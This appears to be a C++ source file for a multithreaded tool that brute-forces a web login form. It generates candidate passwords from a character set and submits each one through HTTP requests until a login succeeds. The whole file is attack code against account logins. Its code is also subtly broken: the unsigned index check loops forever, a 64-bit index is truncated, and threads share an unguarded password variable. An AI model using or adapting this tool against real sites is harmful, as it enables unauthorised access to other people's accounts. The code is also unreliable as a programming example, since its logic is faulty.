#include "sender.h"

const char* Sender::char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=~`[]{}|;:'\",.<>?/";

// gotta add 2 threads
Sender::Sender(
    std::string url,
    std::string nameOfLoginNameField,
    std::string nameToLogin,
    std::string passwordFieldName,
    size_t countThreads)
{
    qDebug() << "Sender instantiated\n";
    this->tryPassword(url, nameOfLoginNameField, nameToLogin, passwordFieldName, countThreads);
}

Sender::~Sender(){
    qDebug() << "Sender destroyed\n";
}

void Sender::tryPassword(
    std::string url,
    std::string nameOfLoginNameField,
    std::string nameToLogin,
    std::string passwordFieldName,
    size_t numThreads)
{
    // Mutex for thread-safe access to shared resources
    std::mutex trySuccessMutex;

    // Function that each thread will run
    auto threadFunction = [this, &url, &nameOfLoginNameField, &nameToLogin, &passwordFieldName, &trySuccessMutex](size_t startIndex, size_t endIndex) {
        for (size_t i = startIndex; i < endIndex; i++) {
            // If the password has already been found, exit the loop early
            {
                std::lock_guard<std::mutex> lock(trySuccessMutex);
                if (this->trySuccess) {
                    break; // Exit if password has already been found
                }
            }
            this->passwordTry = combination_at_index(i);

            const std::string concatenated = "password try: " + this->passwordTry;
            const char* output = concatenated.c_str();
            qDebug(output);

            HttpReq req(url, nameOfLoginNameField, nameToLogin, passwordFieldName, passwordTry);
            if (req.sendReq()) {
                // Lock mutex to modify shared variable trySuccess
                std::lock_guard<std::mutex> lock(trySuccessMutex);
                this->trySuccess = true;
                break; // Exit early if successful password found
            }
        }
    };

    // Calculate the range each thread will process
    size_t totalCombinations = 18446744073709551615; // 2^64 - 1
    size_t rangePerThread = totalCombinations / numThreads;

    std::vector<std::thread> threads;

    // Start threads
    for (size_t t = 0; t < numThreads; t++) {
        size_t startIndex = t * rangePerThread;
        size_t endIndex = (t == numThreads - 1) ? totalCombinations : (t + 1) * rangePerThread;

        threads.emplace_back(threadFunction, startIndex, endIndex);
    }

    // Wait for all threads to finish
    for (auto& t : threads) {
        t.join();
    }
}

std::string Sender::combination_at_index(unsigned int index) {
    int base = strlen(char_set);  // Total number of characters in the set
    std::string result;

    // Ensure the index is valid (non-negative)
    if (index < 0) {
        return "Invalid index";
    }

    // Generate the combination string
    while (index >= 0) {
        result = char_set[index % base] + result;  // Get the character from the set
        index = index / base - 1;  // Move to the next "place" in the combination
    }

    return result;
}
